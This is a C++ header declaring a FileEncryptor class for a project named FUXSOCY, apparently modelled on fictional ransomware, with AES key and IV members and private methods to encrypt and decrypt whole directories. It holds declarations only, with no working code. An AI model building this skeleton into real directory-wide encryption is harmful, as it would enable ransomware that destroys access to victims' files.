#ifndef FUXSOCY_FILE_ENCRYPTOR_H_
#define FUXSOCY_FILE_ENCRYPTOR_H_

extern "C" {
#include <dirent.h>
#include <fcntl.h>
}

#include <vector>
#include <string>

#include <cryptopp/aes.h>

class FileEncryptor {
 public:
  FileEncryptor(const std::string& directory);
  virtual ~FileEncryptor();

  std::vector<std::string> ListDirectory() const;

 private:
  void EncryptDirectory(const std::string& directory) const;
  void DecryptDirectory(const std::string& directory) const;

  
  CryptoPP::byte* iv_;
  CryptoPP::byte* key_;
  std::string directory_;
};

#endif // FUXSOCY_FILE_ENCRYPTOR_H_
